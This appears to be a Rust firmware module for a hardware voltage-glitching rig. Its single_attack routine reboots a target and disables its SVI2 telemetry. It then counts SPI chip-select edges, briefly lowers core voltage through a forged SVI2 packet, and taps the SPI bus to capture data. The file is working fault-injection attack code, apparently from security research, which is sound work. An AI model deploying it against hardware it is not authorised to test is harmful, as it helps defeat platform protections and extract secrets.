use defmt::{info, warn};
use embassy_rp::Peri;
use embassy_rp::gpio::{Flex, Input, Output, Pull};
use embassy_rp::peripherals::{DMA_CH2, DMA_CH3, PIN_2, PIN_4, PIN_5, SPI0};
use embassy_rp::pio::Instance;
use embassy_time::{Delay, Duration, Timer, with_timeout};
use embedded_hal::delay::DelayNs;
use glitcher_rpc::{Controller2HostMessage, SPI_TAP_MAX_BYTES};

use crate::i2c_pio::I2cPio;
use crate::spi_tap::{self, SpiTapResult};
use crate::svi2;

const ATTACK_SPI_TAP_TIMEOUT_S: u32 = 5;

pub async fn single_attack<PIO: Instance, const SM: usize>(
    target_reboot_pin: &mut Flex<'_>,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
    spi_slave_cs_pin: &mut Peri<'static, PIN_5>,
    spi0: &mut Peri<'static, SPI0>,
    spi_slave_clk: &mut Peri<'static, PIN_2>,
    spi_slave_miso: &mut Peri<'static, PIN_4>,
    spi_tx_dma: &mut Peri<'static, DMA_CH2>,
    spi_rx_dma: &mut Peri<'static, DMA_CH3>,
    capture: &mut [u8; SPI_TAP_MAX_BYTES],
    spi_byte_count: u16,
    chip_select_count: u32,
    vid: u8,
    wait_duration_ns: u32,
    dip_duration_ns: u32,
) -> Result<SpiTapResult, Controller2HostMessage> {
    // Check that target is running
    if (0..1_000).all(|_| svc_in.is_low()) {
        return Err(Controller2HostMessage::GlitchAttackFailedTargetNotRunning);
    }
    // Reboot
    reboot_target_with_trigger(target_reboot_pin, logic_analyzer_trigger).await;
    // Correctly disable telemetry
    match wait_boot_and_disable_telemetry(30, svd_in, svc_in, logic_analyzer_trigger, i2c).await {
        Controller2HostMessage::TelemetryDisabled => (),
        msg => return Err(msg),
    }
    // Wait for chip_select_count spi triggers (falling flanks)
    let mut cs_input = Flex::new(spi_slave_cs_pin.reborrow());
    cs_input.set_pull(Pull::None);
    cs_input.set_as_input();
    let mut was_high = cs_input.is_high();

    // Indicate chip select count by pulling trigger high
    logic_analyzer_trigger.set_high();
    for _ in 0..chip_select_count {
        // Polling avoids the interrupt and executor latency of an async GPIO wait.
        if !(0..200_000).any(|_| {
            let is_high = cs_input.is_high();
            let falling_edge = was_high && !is_high;
            was_high = is_high;
            falling_edge
        }) {
            warn!("Failed to count CS falling edge!");
            return Err(Controller2HostMessage::GlitchAttackFailed);
        }
    }
    logic_analyzer_trigger.set_low();

    // Wait for specified delay (wait_duration_ns)
    Delay.delay_ns(wait_duration_ns);

    // Show when actually glitching
    {
        logic_analyzer_trigger.set_high();
        // Inject SVI2 packet (with custom value vid)
        svi2::set_vid(i2c, Some(vid));

        // Wait for specified delay (dip_duration_ns)
        Delay.delay_ns(dip_duration_ns);

        // Inject SVI2 packet (with default value)
        svi2::set_vid(i2c, None);
        logic_analyzer_trigger.set_low();
    }

    // Recognize if the machine continues running by checking for another CS edge.
    if with_timeout(Duration::from_micros(500), cs_input.wait_for_falling_edge())
        .await
        .is_err()
    {
        info!("Machine did not continue execution after glitch");
        return Err(Controller2HostMessage::GlitchAttackFailed);
    }

    // Drop cs
    drop(cs_input);

    // SPI Tap for the specified amount of bytes
    spi_tap::tap_spi(
        spi0,
        spi_slave_clk,
        spi_slave_miso,
        spi_slave_cs_pin,
        spi_tx_dma,
        spi_rx_dma,
        capture,
        spi_byte_count,
        ATTACK_SPI_TAP_TIMEOUT_S,
    )
    .await
    .map_err(Controller2HostMessage::SpiTapError)
}

pub async fn wait_boot_and_disable_telemetry<PIO: Instance, const SM: usize>(
    timeout_ms: u64,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
) -> Controller2HostMessage {
    match with_timeout(Duration::from_millis(timeout_ms), svd_in.wait_for_high()).await {
        Ok(()) => {
            critical_section::with(|_| {
                // Blocking wait
                Delay.delay_us(50);

                logic_analyzer_trigger.set_high();

                if !(0..20_000).any(|_| svc_in.is_low()) {
                    logic_analyzer_trigger.set_low();
                    return false;
                }

                logic_analyzer_trigger.set_low();

                // Optional cycle-level adjustment goes here.
                Delay.delay_us(5);

                logic_analyzer_trigger.set_high();
                svi2::disable_telemetry(i2c);
                logic_analyzer_trigger.set_low();

                true
            })
            .then_some(Controller2HostMessage::TelemetryDisabled)
            .unwrap_or(Controller2HostMessage::TelemetryTimedOut)
        }
        Err(_) => Controller2HostMessage::TelemetryTimedOut,
    }
}

/// Reboot the target and pulse the logic-analyzer trigger after the reboot.
pub async fn reboot_target_with_trigger(
    target_reboot_pin: &mut Flex<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
) {
    reboot_target(target_reboot_pin).await;
    logic_analyzer_trigger.set_high();
    Timer::after_millis(5).await;
    logic_analyzer_trigger.set_low();
}

/// Pulse the target reset line low, leaving it otherwise high-impedance.
pub async fn reboot_target(target_reboot_pin: &mut Flex<'_>) {
    pulse_low(target_reboot_pin, 1).await;
}

/// Hold the target power button low, leaving the line otherwise high-impedance.
pub async fn press_power_button(power_button_pin: &mut Flex<'_>, duration_ms: u32) {
    pulse_low(power_button_pin, duration_ms).await;
}

async fn pulse_low(pin: &mut Flex<'_>, duration_ms: u32) {
    pin.set_low();
    pin.set_as_output();
    Timer::after_millis(u64::from(duration_ms)).await;
    pin.set_as_input();
}
